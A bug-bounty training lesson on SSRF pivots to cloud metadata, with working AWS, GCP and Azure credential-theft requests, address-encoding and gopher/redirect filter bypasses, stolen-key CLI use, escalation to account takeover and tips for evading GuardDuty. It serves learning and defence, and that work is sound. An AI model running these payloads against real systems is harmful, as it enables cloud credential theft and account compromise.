# Lesson 03 — SSRF → Cloud Metadata (the pivot that becomes Critical)

> **Source material:** HackerOne #2262382 (HackerOne's own critical), #508459 (webhooks → AWS
> private keys), EXNESS #1864188 ($3,000 GraphQL SSRF), `ssrfpayloads.com` IMDS deep-dive,
> `blog.cyberxplore.com/ssrf-cloud-metadata-account-takeover`, Resecurity SSRF-to-AWS analysis
> **Format:** writeup → mechanism → raw traffic → bypasses → escalation → practice
> **Status:** Lesson 3 of the study track

---

## 1. The one-line definition

**SSRF = the server makes a request on your behalf, from inside the trust boundary.**

On a plain box that's already bad (internal admin panels, unauthenticated Redis/Elasticsearch,
subnet sweeps). In the cloud it becomes **Critical** for one reason: every major provider runs a
metadata service on the same magic address — **`169.254.169.254`** — whose entire job is to hand
secrets to the code running there. Trick the app into requesting it and **you inherit the
instance's identity.**

CWE-918. OWASP A10. And the throughline: **SSRF is rarely the whole exploit — it's the pivot.**

---

## 2. Why `169.254.169.254` specifically

`169.254.0.0/16` is the **link-local** range (RFC 3927). It is **not routable off the local
segment** — which is exactly why cloud providers picked it. Every VM can reach its own metadata
without that traffic ever touching a real network.

Convenient for the platform. Also a perfect target: a **fixed, well-known address** that responds
with **no authentication** beyond, sometimes, a header.

What it hands out: instance config, **user-data scripts** (teams love stuffing secrets into
those), and most importantly — **the credentials of the IAM role attached to the instance.**

---

## 3. Real money from real SSRF reports

| Report | Program | Bounty | The bug |
|---|---|---|---|
| [#2262382](https://hackerone.com/reports/2262382) | **HackerOne itself** | Critical | Attacker-controlled URL in the **analytics-report** feature → server-side fetch → internal endpoints **including cloud metadata** |
| [#508459](https://hackerone.com/reports/508459) | — | Paid | **Webhooks** made arbitrary HTTP requests → **AWS private keys disclosed** |
| [#1864188](https://hackerone.com/reports/1864188) | EXNESS | **$3,000** | SSRF **inside a GraphQL query** |
| [#2612028](https://hackerone.com/reports/2612028) | Internet Bug Bounty | Paid | **Apache HTTP Server** — SSRF with `mod_rewrite` in server/vhost config |
| — | vulnquest58 writeup | — | **PDF generator** + open redirect → AWS IAM credentials leaked |
| — | Resecurity analysis | — | Image proxy → S3 read + role enumeration |

**Hunting pattern — any feature where a URL you control is consumed server-side:**
webhooks, PDF renderers, link-preview generators, analytics exporters, avatar/import-from-URL,
RSS/sitemap importers, headless-Chrome screenshot services, document/SVG processors.

> **The recurring reality:** "the server made an outbound call it shouldn't have" quietly becomes
> "the server gave us its cloud identity." A read-only image proxy turned into a foothold that
> read S3 buckets and enumerated other roles.

---

## 4. Confirming the primitive — out-of-band first

Before touching anything internal, prove the server fetches for you:

```http
POST /api/avatar/import HTTP/1.1
Host: example.com
Content-Type: application/json

{"image_url":"http://abcd1234.oastify.com/ping"}
```

Use **Burp Collaborator** or self-hosted **interactsh**. If the listener logs a hit, the server
dereferences URLs for us.

**Read the hit type carefully:** a **DNS-only** hit vs a **full HTTP callback** are different
bugs. DNS-only sometimes means a rendering pipeline that resolves but never returns the body —
that kills your ability to exfiltrate metadata, so you need a different primitive.

---

## 5. AWS IMDSv1 — a single unauthenticated GET

Walk the tree:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The second path returns the **role name**. Append it:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

You get:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-09-15T18:00:00Z"
}
```

Through the vulnerable parameter, that's just:

```json
{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

### Using them — and the detection trap

```
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

**`get-caller-identity` is always the first command.** It confirms the creds work and gives you
the **role ARN**, which tells you what to enumerate next.

**Do NOT start firing `s3 ls` blindly.** That generates noise and trips **GuardDuty**, which
specifically flags credentials used from an IP that isn't the instance's
(`InstanceCredentialExfiltration`). That detection is real, and it's the main reason
smash-and-grab credential theft gets caught.

### Other AWS paths worth grabbing

```
http://169.254.169.254/latest/user-data                              # often has secrets
http://169.254.169.254/latest/dynamic/instance-identity/document     # account ID, region
http://169.254.169.254/latest/meta-data/iam/info
```

---

## 6. AWS IMDSv2 — and why it's not the wall people claim

IMDSv2 made the service **session-oriented**. Two steps:

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <token-from-put>
```

The defense rests on two things a basic SSRF can't do: **send a PUT**, and **set a custom
request header**. Plus IMDSv2 sets a default response **hop limit of 1**, so a token can't be
relayed through a proxy hop.

### The part the "just enable IMDSv2" advice skips

IMDSv2 only helps if your SSRF is **limited to simple GETs with no header control.** The moment
the vulnerable feature lets you choose the **method** or **inject headers** — and a surprising
number do — IMDSv2 falls:

- a full-featured **HTTP proxy** SSRF
- a **`gopher://`** primitive that writes raw bytes (you compose the entire two-step token dance
  by hand, including the `PUT` line and arbitrary headers)
- a fetcher that **forwards user-controlled headers**

> **IMDSv2 raises the bar from "any SSRF" to "SSRF with method or header control." That's a real
> improvement. It is not immunity.** Reports that mark a finding resolved purely because IMDSv2
> is on are wrong. The setting that matters is `HttpTokens = required` — i.e. **IMDSv1 disabled**,
> not merely IMDSv2 available. If IMDSv1 still answers, the attacker just uses the old path.

---

## 7. GCP — don't forget the header

Same IP, plus `metadata.google.internal`. It refuses any request without a specific header:

```
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json"
```

That header requirement **is** GCP's SSRF mitigation — and it **predates IMDSv2 by years**. A
plain GET-only SSRF **cannot read GCP metadata at all.** You need header injection or a fetcher
that sets it.

The token is an **OAuth2 bearer token**, not long-lived keys. Use it directly against
`googleapis.com`. Also grab:

```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/     # startup scripts, ssh-keys
```

The old `?recursive=true&alt=json` trick dumps a lot at once. Worth trying.

---

## 8. Azure — header **plus** `api-version`

Azure's IMDS wants a header (`Metadata: true`) **and** an `api-version` query param. Missing the
param returns an error that **looks like the endpoint is dead** — that's the classic false negative:

```
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

The **identity token** path is the prize — a bearer token for the VM's managed identity. Same
header-injection requirement as GCP, so GET-only SSRF doesn't reach it.

---

## 9. Getting the headers in when the fetcher won't set them

The recurring theme: GCP/Azure need headers, IMDSv2 needs a header **plus** a non-GET method.

| Approach | Notes |
|---|---|
| **`gopher://`** | Write raw TCP bytes — compose the full request line, headers, blank line. **Most reliable** way to satisfy header requirements. This is why protocol smuggling matters so much in cloud SSRF |
| **CRLF injection in the URL** | If the client lets `%0d%0a` into the request. Increasingly rare, still worth a shot |
| **Open redirect / smuggling chain** | Through a host that adds or preserves your header. Situational |

**And the address itself can be disguised** to slip past string blocklists:

```
http://2852039166/                        # decimal
http://0251.0376.0251.0376/               # octal
http://[::ffff:169.254.169.254]/          # IPv4-mapped IPv6
http://0xA9.0xFE.0xA9.0xFE/               # hex
http://169.254.169.254.nip.io/            # DNS name resolving to link-local
```

**Our favourite in practice: an open redirect on an allowlisted domain.** The app dutifully
validates that the URL points at a trusted host, follows the 302, and lands on the metadata
endpoint anyway. **That is exactly why validating the initial URL string, on its own, is not
enough** — you must re-resolve and re-check after every redirect.

---

## 10. From credentials to account takeover — the blast radius

The credentials are ordinary STS temporary keys. Export all three and drive the CLI:

```
export AWS_ACCESS_KEY_ID=ASIAEXAMPLEKEY
export AWS_SECRET_ACCESS_KEY=EXAMPLEsecret...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...
aws sts get-caller-identity
```

**Blast radius is a straight function of what that role is permitted to do:**

1. **Quiet enumeration** — which buckets, which secrets, which other roles
2. **Secrets Manager / SSM Parameter Store read** → database passwords and API keys that unlock
   far more than the one instance
3. **Broad IAM rights (the anti-pattern)** → attach an admin policy, mint a fresh access key on a
   privileged user, or assume a stronger role → **full account takeover**

Maps to MITRE ATT&CK **T1552 (Unsecured Credentials)** and reuse of alternate authentication
material.

> **The blunt lesson from years of engagements: SSRF severity is set by the instance role, not by
> the web bug itself.** A tightly scoped role turns a scary finding into a contained one. A
> permissive role turns a single URL parameter into a cloud-wide incident.

---

## 11. How to test — methodology

```
01. Find features that make outbound requests: webhooks, importers, PDF/image renderers,
    link previews, analytics exporters, RSS/sitemap, screenshot services, SVG/XML processors
02. Confirm with an OOB listener (Collaborator / interactsh). Note DNS-only vs full HTTP
03. Test which SCHEMES work: http, https, gopher, file, dict, ftp
04. Test METHOD control: can you force PUT/POST?
05. Test HEADER control: does it forward user headers? CRLF injection?
06. Probe internal: 127.0.0.1, localhost, RFC1918 ranges, common service ports
07. Probe metadata: 169.254.169.254 (AWS/GCP/Azure paths)
08. Try the address encodings (decimal, octal, hex, IPv6-mapped, nip.io)
09. Test REDIRECT following — open redirect on an allowlisted domain is the money bypass
10. If metadata is reached, prove credential VALIDITY with get-caller-identity
11. Demonstrate blast radius — but avoid GuardDuty-tripping noise (don't blindly list buckets)
12. Report with raw request/response + the exact impact of the role
```

**Redirection is a required test.** Many programs only blocklist the literal string
`169.254.169.254`. The open-redirect bypass defeats that entirely.

---

## 12. Common mistakes

- **Stopping at "I got a 200 from an internal IP."** Prove impact — credentials, data, or a
  service you shouldn't reach. Internal reachability alone is often rated Low/Informational.
- **Giving up when IMDSv2 is on.** Check whether you have method or header control. Check whether
  **IMDSv1 is still enabled** (`HttpTokens` not `required`) — then just use the old path.
- **Forgetting the GCP/Azure header.** A "dead" endpoint is often just a missing header or
  `api-version`. That's a false negative, not a non-vulnerability.
- **Missing the redirect test.** The open-redirect-on-allowlisted-domain bypass is the most
  reliable one in practice.
- **Tripping GuardDuty.** Don't blindly enumerate S3. One `get-caller-identity` then quiet,
  targeted enumeration.
- **String blocklist thinking.** Testing only the literal `169.254.169.254` and concluding
  "blocked" is wrong — decimal/octal/hex/IPv6 all bypass it.
- **Causing real DoS** with recursive payloads. Measured proof only.

---

## 13. Practice targets

| Target | Why |
|---|---|
| **PortSwigger SSRF labs** | the canonical progression, includes metadata + bypass labs |
| **A local cloud emulator (LocalStack)** | safely practice the IMDS credential flow end to end |
| **Any app with a webhook tester** | "click Test" is a server-side request generator |
| **PDF/render services** | HTML→PDF follows `<img>`, `<iframe>`, CSS `url()` |
| **SVG upload features** | SVG renderers fetch external resources — XXE quietly becomes SSRF |

**Assignment:** in the lab VM, stand up a deliberately vulnerable app with a URL-fetch feature,
add a naive blocklist matching the literal `169.254.169.254`, then bypass it four ways —
decimal, IPv6-mapped, DNS name, and an open redirect. Then do the same against a PortSwigger
metadata lab. That's the reflex that finds this class in the wild.

---

## 14. Key takeaways

1. **`169.254.169.254` is the whole reason SSRF is Critical in the cloud.** Learn the three
   providers' paths by heart.
2. **IMDSv1 = free win. IMDSv2 = "SSRF with method or header control."** Not immunity.
   `HttpTokens = required` is the real fix — check it.
3. **GCP/Azure need headers.** A GET-only SSRF can't read them. `gopher://` is how you fix that.
4. **The address can be disguised.** Decimal, octal, hex, IPv6-mapped, DNS. String blocklists fail.
5. **Open redirect on an allowlisted domain is the most reliable bypass.** Re-resolution after
   redirects is the only real fix.
6. **Severity is set by the IAM role, not the web bug.** A permissive role = cloud-wide incident.
7. **`get-caller-identity` first, quiet enumeration second.** Noise trips GuardDuty and burns
   your access.
8. **SSRF is a pivot, not a destination.** Chain it to secrets, S3, or role assumption.

---

## 15. What to study next

| You learned | Study next |
|---|---|
| SSRF → metadata | **SSRF filter bypasses** (gopher, DNS rebinding, protocol smuggling) |
| AWS credential theft | IAM privilege escalation paths + role chaining |
| Header injection for GCP/Azure | **CRLF injection / request smuggling** |
| Open-redirect bypass | Open redirect hunting as a standalone class |
| Metadata pivot | Container escapes: Kubernetes service-account tokens, `169.254.169.254` in pods |

---

## 16. Reference index

| # | Source | Bounty | What it teaches |
|---|---|---|---|
| 1 | [HackerOne #2262382](https://hackerone.com/reports/2262382) | Critical | analytics webhook → internal + metadata |
| 2 | [HackerOne #508459](https://hackerone.com/reports/508459) | Paid | webhooks → AWS private keys |
| 3 | [EXNESS #1864188](https://hackerone.com/reports/1864188) | $3,000 | SSRF inside a GraphQL query |
| 4 | [IBB #2612028](https://hackerone.com/reports/2612028) | Paid | Apache mod_rewrite SSRF |
| 5 | [ssrfpayloads.com IMDS deep-dive](https://www.ssrfpayloads.com/en/blog/ssrf-cloud-metadata-169-254-169-254) | — | IMDSv1/v2, GCP/Azure, gopher |
| 6 | [cyberxplore: SSRF → cloud ATO](https://blog.cyberxplore.com/ssrf-cloud-metadata-account-takeover/) | — | full chain + defences |
| 7 | [Resecurity: SSRF → AWS metadata](https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials) | — | EC2 credential theft |
| 8 | [vulnquest58: PDF generator → AWS creds](https://vulnquest58.github.io/bugbounty/writeups/ssrf-aws-leak/) | — | renderer + redirect chain |
